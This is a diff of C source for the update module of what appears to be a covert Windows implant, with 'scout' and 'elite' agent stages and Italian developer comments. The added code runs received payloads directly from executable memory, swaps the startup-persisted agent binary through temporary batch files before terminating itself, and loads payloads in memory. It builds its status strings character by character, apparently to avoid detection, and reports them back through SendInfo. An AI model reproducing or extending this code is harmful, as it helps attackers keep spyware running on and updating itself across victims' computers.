@@ -5,29 +5,127 @@
 #include "upgrade.h"
 #include "bits.h"
 #include "ldr.h"
+#include "proto.h"
 
 extern BOOL uMelted;
 extern PULONG uSynchro;
 extern PWCHAR GetRandomString(ULONG uMin);
 extern HANDLE hScoutSharedMemory;
 
-
-BOOL Upgrade(PWCHAR pUpgradePath, PBYTE pFileBuffer, ULONG uFileLength)
+BOOL UpgradeRecover(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 {
-#ifdef _DEBUG
-	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
-	swprintf_s(pDebugString, 1024, L"[+] Dumping %d bytes of upgrade to %s\n", uFileLength, pUpgradePath);
-	OutputDebugString(pDebugString);
-	free(pDebugString);
-#endif
+	BOOL bRet;
+	PVOID pExecMemory;
+	
+	pExecMemory = VirtualAlloc(NULL, uFileLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(pExecMemory, pFileBuffer, uFileLength);
 
-	OutputDebugString(L"Starting upgrade!");
+	bRet = (*(BOOL (*)()) pExecMemory)();
+
+	VirtualFree(pExecMemory, 0, MEM_RELEASE);
+	return bRet;
+}
+
+BOOL UpgradeScout(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
+{
+	ULONG uOut;
+	LPWSTR pBatchName;
+	BOOL bRetVal = FALSE;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	LPWSTR pFileName = CreateTempFile();
+	LPWSTR pScoutName = GetStartupScoutName();
+	
+	hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		WCHAR pLastErr[16];
+		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'C', L'r', L'e', L'a', L't', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };
+
+		swprintf(pLastErr, L"%x", GetLastError());
+		wcscat(pInfoString, pLastErr);
+		SendInfo(pInfoString);
+
+		DeleteFile(pFileName);
+		free(pFileName);
+		free(pScoutName);
+
+		return FALSE;
+	}
+
+	BOOL bVal = WriteFile(hFile, pFileBuffer, uFileLength, &uOut, NULL);
+	CloseHandle(hFile);
+
+	if (!bVal)
+	{
+		WCHAR pLastErr[16];
+		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'W', L'r', L'i', L't', L'e', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };
+
+		swprintf(pLastErr, L"%x", GetLastError());
+		wcscat(pInfoString, pLastErr);
+		SendInfo(pInfoString);
+
+		DeleteFile(pFileName);
+		free(pFileName);
+		free(pScoutName);
+
+		return FALSE;
+	}
+
+	if (!AmIFromStartup() || uMelted == TRUE) // il meltato non dovrebbe mai finire in STARTUP ma tant'e'.
+	{
+		CreateCopyBatch(pFileName, pScoutName, &pBatchName);
+		if (!StartBatch(pBatchName))
+		{
+			WCHAR pLastErr[16];
+			WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'S', L't', L'a', L'r', L't', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };
+
+			swprintf(pLastErr, L"%x", GetLastError());
+			wcscat(pInfoString, pLastErr);
+			SendInfo(pInfoString);			
+
+			bRetVal = FALSE;
+		}
+		
+		MySleep(2000);
+	}
+	else
+	{
+		CreateReplaceBatch(pScoutName, pFileName, &pBatchName);
+
+		if (StartBatch(pBatchName))
+			TerminateProcess(GetCurrentProcess(), 0);
+
+		//else
+		WCHAR pLastErr[16];
+		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'S', L't', L'a', L'r', L't', L'2', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };
+		
+		swprintf(pLastErr, L"%x", GetLastError());
+		wcscat(pInfoString, pLastErr);
+		SendInfo(pInfoString);	
+
+		bRetVal = FALSE;
+	}
+
+	DeleteFile(pBatchName);
+	DeleteFile(pFileName);
+
+	free(pScoutName);
+	free(pFileName);
+	free(pBatchName);
+	
+	return bRetVal;
+}
+
+
+
+ULONG UpgradeElite(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
+{
+	ULONG uRetries = 0;
+	BOOL bSuccess = FALSE;
 
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MemoryLoader, pFileBuffer, 0, NULL);
 	WaitForSingleObject(hThread, 60000);
 
-	ULONG uRetries = 0;
-	BOOL bSuccess = FALSE;
 	while (uRetries < 10)
 	{
 		if (ExistsEliteSharedMemory())
@@ -60,7 +158,7 @@ BOOL Upgrade(PWCHAR pUpgradePath, PBYTE pFileBuffer, ULONG uFileLength)
 #endif
 
 	return bSuccess;
-	/*																				rr
+	/*																				
 	if(MemoryLoader(pFileBuffer))
 	{
 		MessageBox(NULL, L"QUI NON TORNA", L"QUI NON", 0);
